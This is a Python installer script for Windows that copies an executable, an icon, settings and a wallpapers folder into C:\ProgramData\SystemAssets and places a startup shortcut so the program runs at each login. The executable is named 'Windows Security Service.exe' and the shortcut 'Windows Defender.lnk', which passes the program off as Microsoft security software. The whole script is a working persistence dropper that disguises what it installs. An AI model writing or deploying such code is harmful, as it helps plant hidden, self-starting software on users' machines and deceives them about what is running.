import os
import shutil
import sys
import subprocess
import json
from win32com.client import Dispatch

# Define paths
wallpaper_folder_name = "Wallpapers"
icon_name = "ShortcutIcon.ico"
exe_name = "Windows Security Service.exe"
settings_file_name = "settings.json"

script_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)  # Works in .exe mode
script_dir = os.path.dirname(script_path)
destination_folder = r"C:\ProgramData\SystemAssets"

# Paths for new locations
new_exe_path = os.path.join(destination_folder, exe_name)
new_icon_path = os.path.join(destination_folder, icon_name)
new_wallpaper_folder_path = os.path.join(destination_folder, wallpaper_folder_name)
new_settings_path = os.path.join(destination_folder, settings_file_name)

# Define the Startup folder and shortcut path
startup_folder = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
shortcut_path = os.path.join(startup_folder, "Windows Defender.lnk")

# Load settings from settings.json
settings = {"wait_until_restart_to_run": True}  # Default if settings.json is missing
settings_path = os.path.join(script_dir, settings_file_name)

if os.path.exists(settings_path):
    try:
        with open(settings_path, "r") as f:
            settings = json.load(f)
    except json.JSONDecodeError:
        print("Error reading settings.json, using defaults.")

# Ensure the SystemAssets folder exists
try:
    if not os.path.exists(destination_folder):
        os.makedirs(destination_folder)

    # Copy the Wallpapers folder (overwrite if exists)
    old_wallpaper_folder_path = os.path.join(script_dir, wallpaper_folder_name)
    if os.path.exists(old_wallpaper_folder_path):
        if os.path.exists(new_wallpaper_folder_path):
            shutil.rmtree(new_wallpaper_folder_path)  # Delete existing folder before copying
        shutil.copytree(old_wallpaper_folder_path, new_wallpaper_folder_path)
        print(f"Copied {wallpaper_folder_name} folder to {new_wallpaper_folder_path}")
    else:
        print(f"Wallpapers folder not found: {wallpaper_folder_name}")

    # Copy the executable (overwrite if exists)
    exe_path = os.path.join(script_dir, exe_name)
    if os.path.exists(exe_path):
        shutil.copy2(exe_path, new_exe_path)
        print(f"Copied {exe_name} to {new_exe_path}")
    else:
        print("Executable file not found!")

    # Copy the icon (overwrite if exists)
    old_icon_path = os.path.join(script_dir, icon_name)
    if os.path.exists(old_icon_path):
        shutil.copy2(old_icon_path, new_icon_path)
        print(f"Copied {icon_name} to {new_icon_path}")
    else:
        print("Icon file not found!")

    # Copy the settings file (overwrite if exists)
    if os.path.exists(settings_path):
        shutil.copy2(settings_path, new_settings_path)
        print(f"Copied {settings_file_name} to {new_settings_path}")
    else:
        print(f"Settings file not found: {settings_file_name}")

except Exception as e:
    print(f"Error: {e}")

# Create a shortcut to run the executable as administrator with custom icon
def create_admin_shortcut(target_path, shortcut_path, icon_path):
    shell = Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = target_path
    shortcut.WorkingDirectory = os.path.dirname(target_path)
    shortcut.IconLocation = icon_path
    shortcut.Arguments = ""
    shortcut.Save()
    print(f"Shortcut created at {shortcut_path} with custom icon.")

# Create the shortcut in the Startup folder
try:
    create_admin_shortcut(new_exe_path, shortcut_path, new_icon_path)
except Exception as e:
    print(f"Error creating shortcut: {e}")

# If "wait_until_restart_to_run" is False, run the shortcut immediately
if not settings.get("wait_until_restart_to_run", True):
    try:
        print("Launching the shortcut immediately...")
        subprocess.Popen(shortcut_path, shell=True)  # Run the shortcut
    except Exception as e:
        print(f"Error launching shortcut: {e}")

print("Setup completed successfully.")
